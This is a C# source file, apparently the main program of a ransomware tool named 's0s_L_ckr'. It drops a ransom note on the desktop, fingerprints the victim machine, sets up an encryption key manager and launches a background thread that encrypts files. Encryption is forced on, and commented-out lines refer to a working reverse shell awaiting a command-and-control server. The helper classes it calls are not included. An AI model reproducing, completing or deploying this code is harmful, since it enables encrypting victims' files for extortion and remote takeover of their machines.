using System;
using System.Diagnostics;
using System.Threading;

/*************************
 * Encrypted File        *
 * ***********************
 * Signature            *
 * KEY                  *
 * IV                   *
 * Encrypted Data       *
 * *********************/



namespace s0s_L_ckr
{
    class Program
    {
        static int Main(string[] args)
        {
           // Process process = new Process();
           // process.StartInfo.FileName = "powershell.exe";
           // process.StartInfo.Arguments = "-c\"Start-Sleep -s 10\"";
           // process.StartInfo.Arguments = "-c\"Get-ComputerInfo\"";
           // Process process1 = new Process();
           //// process1.StartInfo.FileName = "powershell.exe";
           // process.Start();
            //Reverse shell works. Needs a C&C
            // Comn.RevShell.StartShell();
            //var recoByt = Convert.FromBase64String("3EstYvSXUTv1MBpAVIzSV4SVzmA47AEAaW8BH90c481lcVM2YPfTzqiCOEWoKgqYcJqNrijoKa5hqfJfE");


            var recoMess = "Ransom Note: \n \tWhat Happened to my files? \n" +
                "20qUdZOQZw0iatnMEH4ZzM6ZUYiGVhlwFCEl5CaQeQkuFQ5A5vQeKaIe12gt0kosuiil" +
                "epi02ch6RMrRhj3CCFmo4knVUUKH0JgnPrjFgRFcQfOxCPVp2pUFzeGPQ8HxsvO2vO7CC7CEhAqFyL2qWreHVVr9" +
                "Km3yzWIWPJKTLrdS0gxuHuIY4yPqcpp8j5qUYcmfLej88qIIcuowtKXzxwR7EFH8HdhURb6GpZlXJ8kOwOKKk3d4FONdm" +
                "Ck2UCUjUMrGBXpkZg2q272VMqimyUp38pQDX3fGcd4o8kkz7HtcaeBJY2FhwsHduM" +
                "XW19QaAwKz6eNJpzqCeulDes4EzFQ1zH4l7Vwumut5wbEaiD6WM0jqnoHczgKzjER" +
                "sgB4l18olp4zC20kXlQRNCmq8ymn1AwOhibLVF6QoddbhIU9MecY8cjfIZGxfLQHWBaNo" +
                "Ib9ZqIrDo8X05pQqW9MbT88Zluh0OqLvyj9HevMJSJxQK1qS0TXrPk18xdwPfm2UC0WByaPQJqBolNAmuZjnVQe" +
                "IGZpUt5ZcLF2hFDdaogFwrE1oOxfYErZYJNs9urUsk8S0fjqbyB3rHYu9YPKIICRR29epBexzt9F" +
                "hrLbZYa1XL3b2W9wxDFrXMuFPfK3hRKVdKZWIVPvM0QxYUy8EgRQi8pwDDCqwpvf" +
                "cbhYoy8MRrucNjM9CahKofVAOno4qDjubZViVt4TfJ5yACdHS6cmVrEWlCGuJrlTVGU2ga5HVuL8tpVHrj5qNT4" +
                "v0TX0NhZBHh34Qvu2yu54NRv31syOhEU97JeuOWhNK4Fn1ZPc7kz0nFuZLI24XS1EHkcPOL" +
                "pwHjjcow4K0C7xYJcy2ZH5BaluXNljGjz5lteew4Cc4p0cBdkozPkdYHCza0S8KtVgoBI5UNAne5ip9G4NBlDeFveW" +
                "9BywC3RtPvf07jl7GhrznkimVsAj9Y2M98R0Nrx4sHEHGZhFKCvkWfyH6EPmUGPmpZbul1VDHI" +
                "4DAUug3mrU4NuZVrH59M2R3fZB1keXKCGIAalLj76B51fuCCd4aZm" +
                "VqNpE8bHbMRC4Rhjl7FLc8Dra8uOb3QbBYu5hMXoh2NLwhacp4NzVoIXKTqVbnSzNR0GJa4vFUhwE47Xp7eQ2" +
                "jm0bVU7lLylyd1RdJA2JMgc6Dwh1jJF5CF5sQPODQOw60YzpQE1J2PtRFrrDAZYV4YZaUaAFqZBIW5jF0";
            var ransomMessage = new RansomMessage(recoMess, "Recovery Instructions Here", 10);
            ransomMessage.WritMesToDes();


            string ops = (args.Length > 0 && args[0] == "--decrypt" ? "D" : "E");
            bool encrypt = true;
            //Debug Generation
            string fingerprint = null;
            CompIdStrat.StickyFingerPrinter(ref fingerprint);

            // Criptographic Key Manager for Files
            CriptoKeyMgr.EnsrLocPubKey();

            int resultVal = -1;
            ThreadStart threadStart = null;

            //If given E parameter we Encrypt, Else D for Decrypt
            if (encrypt)
            {
                threadStart = new ThreadStart(ENCR_ALL_THE_THINGS);
                resultVal = 0; //Start of Encryption Thread
            }
            else if ("D" == ops)
            {
                //Start of Decrypt thread
                threadStart = new ThreadStart(DECR_ALL_THE_THINGS);
                resultVal = 1; //Start of Decryption Thread
            }
            //If thread contains data
            if (threadStart != null)
            {
                Thread thread = new Thread(threadStart);
                thread.Priority = ThreadPriority.BelowNormal;
                thread.IsBackground = true;
                thread.Start();
                thread.Join();
            }

            return resultVal;
        }

        private static void ENCR_ALL_THE_THINGS()
        {
            EncrStr encryptionStrategy = new EncrStr();
            encryptionStrategy.EncrDis();
        }

        private static void DECR_ALL_THE_THINGS()
        {
            DecStr decryptionStategy = new DecStr();
            decryptionStategy.DecrDis();
        }
    }
}
